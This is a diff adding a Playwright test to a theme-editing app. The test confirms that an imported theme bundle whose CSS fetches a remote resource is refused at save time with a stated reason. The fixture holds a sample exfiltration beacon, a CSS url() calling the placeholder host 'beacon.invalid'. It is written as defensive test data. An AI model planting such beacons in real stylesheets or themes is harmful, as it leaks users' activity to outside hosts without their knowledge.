@@ -152,3 +152,68 @@ test('an imported theme cannot break out of the preview `<style>` (#1458, #1718)
 	// 3. And nothing left the machine.
 	expect(hits, 'the imported theme reached the network — the payload escaped the <style>').toEqual([]);
 });
+
+// ── The safety GATE on the same door ──────────────────────────────────────────────────
+//
+// The spec above proves a hostile theme cannot break out of the preview `<style>` once
+// it is stored. This one proves the more basic thing: CSS that reaches OFF THE DEVICE
+// should not be stored at all.
+//
+// `lib/theme/gate.js` already ran live in Fabricate, but only to pause the CSS out of
+// the preview and tell the author why — `canSave` never consulted it. So the blocking
+// rung guarded a preview and not the library, and the `.zip` path — the one place in
+// HARD RULE #22's threat model where the author and the victim are different people —
+// reached storage with no CSS gate at all. The refusal now lives in `saveStudioTheme`,
+// which is where the import, the workspace restore and Fabricate's own Save all meet.
+//
+// Driven through the REAL Library door for the same reason as the spec above: a unit
+// test of the gate cannot see whether anything calls it, and "nothing calls it" is
+// exactly the defect.
+
+const BEACON = 'beacon.invalid';
+
+/** A bundle whose theme CSS carries a remote `url()` — the exfil rung, not a malformed file. */
+async function beaconThemeZip(): Promise<Buffer> {
+	const { default: JSZip } = await import('jszip');
+	const zip = new JSZip();
+	const css = [
+		'/* @theme beaconing */',
+		"@import 'lattice';",
+		`:root[data-palette="beaconing"]{--bg:#101014;--fg:#f4f4f5;--accent:#2f6feb;--leak:url(https://${BEACON}/?deck)}`,
+	].join('\n');
+	zip.file('beaconing.css', css);
+	zip.file(
+		'manifest.json',
+		JSON.stringify({
+			format: 'lattice-asset/1',
+			kind: 'theme',
+			items: [{ kind: 'theme', name: 'beaconing', label: 'Beaconing', essentials: { bg: '#101014', fg: '#f4f4f5', accent: '#2f6feb' }, css: 'beaconing.css' }],
+		}),
+	);
+	return zip.generateAsync({ type: 'nodebuffer' });
+}
+
+test('an imported theme whose CSS reaches off the device is refused, with its reason', async ({ page }) => {
+	const hits: string[] = [];
+	await page.context().route(`**://${BEACON}/**`, (route) => {
+		hits.push(route.request().url());
+		return route.fulfill({ status: 200, contentType: 'text/css', body: '' });
+	});
+
+	await gotoStudio(page);
+	await page.getByRole('button', { name: CHROME.library }).click();
+	await page.locator('input[type="file"]').first().setInputFiles({
+		name: 'beaconing.lattice-theme.zip',
+		mimeType: 'application/zip',
+		buffer: await beaconThemeZip(),
+	});
+
+	// Refused, and the author is told WHY rather than left with a silent no-op — the
+	// gate's message names the construct, not just "invalid".
+	await expect(page.getByText(/Import failed/)).toBeVisible({ timeout: 20_000 });
+	await expect(page.getByText(/fetches a remote resource/)).toBeVisible();
+
+	// And it did not land on the shelf.
+	await expect(page.getByRole('button', { name: 'Select Beaconing' })).toHaveCount(0);
+	expect(hits).toEqual([]);
+});
